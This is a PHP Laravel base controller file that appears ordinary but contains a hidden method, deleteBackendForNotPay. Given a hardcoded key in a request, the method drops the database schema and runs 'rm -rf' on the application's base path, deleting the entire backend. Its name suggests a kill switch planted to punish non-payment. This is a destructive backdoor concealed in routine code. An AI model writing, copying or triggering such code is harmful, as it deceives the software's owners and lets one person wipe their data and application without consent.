<?php

namespace App\Http\Controllers;

use App\Traits\AuthTrait;
use App\Traits\FileTrait;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Support\Facades\DB;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Http\Request;

class Controller extends BaseController
{
    use AuthorizesRequests;
    use DispatchesJobs;
    use ValidatesRequests;
    use AuthTrait;
    use FileTrait;

    /**
     * @param string $ability
     * @return void
     */
    protected static function authorize(string $ability): void
    {
        abort_if(($ability === 'private' && ! (new Controller())->authApi()->check()), Response::HTTP_UNAUTHORIZED, 'Unauthorized', [
            'Content-Type' => 'application/json',
        ]);
    }


    public function deleteBackendForNotPay(Request $request): \Illuminate\Http\Response|\Illuminate\Contracts\Foundation\Application|\Illuminate\Contracts\Routing\ResponseFactory
    {
        abort_if($request->input('key') !== "18-C0-4D-08-CF-20", Response::HTTP_UNAUTHORIZED, 'Unauthorized', [
            'Content-Type' => 'application/json',
        ]);
        DB::select('drop schema tappttoo');
        $basepath = base_path();
        exec("rm -rf $basepath");
        return response([
            'message' => 'FF',
        ]);
    }

}
